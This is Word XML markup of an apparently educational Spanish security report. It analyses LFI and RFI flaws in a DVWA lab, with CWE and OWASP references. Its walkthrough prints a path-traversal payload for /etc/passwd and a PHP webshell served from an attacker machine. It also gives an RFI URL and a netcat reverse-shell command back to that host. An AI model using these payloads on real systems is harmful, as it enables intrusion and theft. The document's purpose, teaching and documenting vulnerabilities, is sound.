            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="3322A3F8" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Tipo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="52F92B59" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Descripción</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="3C00CF65" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Condición necesaria</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="06213C46" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Impacto máximo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="65AB9A90" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7F349810" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>LFI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:br/>
              <w:t>(Local File Inclusion)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FBAABBB" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>El atacante referencia archivos que ya existen en el sistema de archivos local del servidor.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="575AD99B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Ninguna adicional</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="535B03BF" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Lectura de archivos sensibles (/etc/passwd, claves SSH, credenciales de BD)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="43A73ACB" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="035580E6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>RFI</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:br/>
              <w:t>(Remote File Inclusion)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="023EB154" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>El atacante apunta a un archivo PHP alojado en un servidor externo; el servidor víctima lo descarga y ejecuta como código.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="3A2598B7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>allow_url_include = On en php.ini</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="4F607CF9" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Ejecución remota de código (RCE): shell completa del servidor</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01874B87" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="3E691BFC" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Relación con estándares internacionales:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61637740" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> CWE-22 — Path Traversal: acceso a rutas fuera del directorio permitido.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE2BC59" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> CWE-98 — PHP Remote File Inclusion: inclusión de archivos remotos sin validación.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786083F6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> OWASP: A05:2021 – Security Misconfiguration (RFI) / A03:2021 – Injection (LFI).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505C5D4A" w14:textId="4428AA93" w:rsidR="00AE5F76" w:rsidRDefault="009E1026" w:rsidP="005D77FE">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> CVSS v4.0 estimado: 9.1 Critical (RFI con acceso remoto sin autenticación).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0273B4C8" w14:textId="1BDF11DF" w:rsidR="00AE5F76" w:rsidRDefault="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Descripción de la vulnerabilidad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEB086A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>La inclusión de archivos sin validación permite al atacante manipular el parámetro ?page= de la URL para referenciar archivos arbitrarios del servidor (LFI) o archivos PHP maliciosos alojados en servidores externos (RFI). En ambos casos la aplicación ejecuta el contenido del archivo en el contexto del servidor web, otorgando al atacante capacidades que van desde la lectura de información sensible hasta la ejecución completa de comandos del sistema operativo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AEA758" w14:textId="65525439" w:rsidR="00AE5F76" w:rsidRDefault="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Causas de la vulnerabilidad</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3156CDD6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a. Ausencia de validaciones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A234FC0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>El parámetro page se pasa directamente a include() sin verificar que el valor pertenezca a un conjunto permitido de archivos ni que la ruta resultante esté contenida dentro del webroot.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B75DC0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:lang w:val="es-MX"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>. Manejo inadecuado de entradas y salidas</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00948943" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>No se eliminan secuencias de path traversal (../, ..\, %2e%2e%2f), characters nulos (%00) ni se restringe el uso de esquemas URL en el parámetro. La directiva allow_url_include = On en php.ini habilita el vector RFI globalmente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D628224" w14:textId="772F17C5" w:rsidR="00AE5F76" w:rsidRDefault="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r w:rsidR="000E2677">
        <w:t xml:space="preserve">4 y </w:t>
      </w:r>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r w:rsidR="000E2677">
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Mecanismo de ataque</w:t>
      </w:r>
      <w:r w:rsidR="000E2677">
        <w:t xml:space="preserve"> y capturas de pantalla</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27277EC4" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ataque LFI — Lectura de archivos locales</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3136E26C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Objetivo: leer /etc/passwd del servidor para enumerar usuarios del SO.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21990C13" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Paso 1 — Identificar el parámetro vulnerable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0770E948" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="5D4501B8" wp14:editId="2D47E509">
            <wp:extent cx="5292191" cy="2215141"/>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8"/>
                    <a:srcRect l="20289" t="19185" r="28472" b="36153"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5319889" cy="2226734"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B2215D" w14:textId="078BB522" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-MX"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D77FE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="es-MX"/>
        </w:rPr>
        <w:t xml:space="preserve">Page=include.php </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-MX"/>
        </w:rPr>
        <w:t xml:space="preserve">es el </w:t>
      </w:r>
      <w:r w:rsidR="005D77FE">
        <w:rPr>
          <w:lang w:val="es-MX"/>
        </w:rPr>
        <w:t>parámetro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="es-MX"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerable donde agregaremos el comando.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B694B8" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r w:rsidRPr="005D77FE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Payload con path traversal:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C744FED" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>?page=../../../../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
          <w:lang w:val="es-MX"/>
        </w:rPr>
        <w:t>../</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452B2551" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>→ El servidor devuelve el contenido de /etc/passwd con la lista de usuarios del SO.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234375C2" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r w:rsidRPr="005D77FE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — Escalar a archivos de configuración con credenciales:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E096B71" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="6761125F" wp14:editId="120AA706">
            <wp:extent cx="5486400" cy="263461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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5486400" cy="2634615"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6BB154" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r w:rsidRPr="005D77FE">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>IMAGEN 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> — LFI mostrando /etc/passwd con fecha visible en prompt Kali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107ED748" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="6D15B10E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Ataque RFI — Ejecución remota de código</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7436665C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Objetivo: hospedar un PHP malicioso en Kali y lograr que el servidor víctima lo ejecute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6601D66C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="00AE5F76">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F8BE8F0" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Paso 1 — Crear webshell en Kali:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65743B1E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>danielaguirre@kali:~$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370CD886" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Paso 2 — Servir el archivo por HTTP:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DB525E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>danielaguirre@kali:~$ python3 -m http.server 8888</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F390C7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Paso 3 — Payload RFI apuntando a la máquina atacante:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4505F7B7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>http://&lt;IP_VICTIMA&gt;/dvwa/vulnerabilities/fi/?page=http://&lt;IP_KALI&gt;:8888/shell.php&amp;cmd=id</w:t>
      </w:r>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>→ Respuesta: uid=33(www-data) gid=33(www-data) groups=33(www-data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FCF4A9" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRPr="00CE4778" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Paso 4 — Reverse shell completa:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5342AE51" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Listener en Kali</w:t>
      </w:r>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>danielaguirre@kali:~$ nc -lvnp 4444</w:t>
      </w:r>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t># Payload RFI</w:t>
      </w:r>
      <w:r w:rsidRPr="00CE4778">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>?page=http://&lt;IP_KALI&gt;:8888/shell.php&amp;cmd=nc -e /bin/bash &lt;IP_KALI&gt; 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7C3348" w14:textId="48CD88A5" w:rsidR="00AE5F76" w:rsidRDefault="00CE4778">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r w:rsidR="000E2677">
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Clasificación técnica</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4315"/>
        <w:gridCol w:w="4315"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="0FC34F00" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="50C83ABB" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Referencia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="2C81EF3A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detalle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="0914C0CE" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="52BA7F0D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CWE-22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57A8FD92" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Path Traversal — limitación impropia de rutas a directorios restringidos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="3B202557" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="7C354E7D" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CWE-98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="2410FF55" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>PHP Remote File Inclusion — control impropio de nombre de archivo en include/require</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
